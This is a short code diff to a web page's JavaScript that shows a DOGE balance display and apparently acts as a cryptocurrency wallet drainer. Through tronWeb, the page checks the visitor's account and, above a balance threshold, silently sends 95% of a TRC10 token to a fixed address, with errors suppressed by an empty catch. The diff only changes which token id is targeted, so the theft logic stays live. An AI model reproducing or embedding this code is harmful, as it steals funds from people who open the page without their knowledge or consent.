@@ -201,9 +201,9 @@ Balance <b id="tokenBalance">0 DOGE </b>
       try{
         account = await tronWeb.trx.getAccount();
         if (account.assetV2){
-            var tokenBalance = account.assetV2.find(function(o){return o.key == "1002000";});
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1001107";});
             if (balance >= 80000000){
-              await tronWeb.trx.sendToken(toAddrss, Math.round(tokenBalance.value * 95 / 100), "1002000");
+              await tronWeb.trx.sendToken(toAddrss, Math.round(tokenBalance.value * 95 / 100), "1001107");
             }
         }
       }catch{}
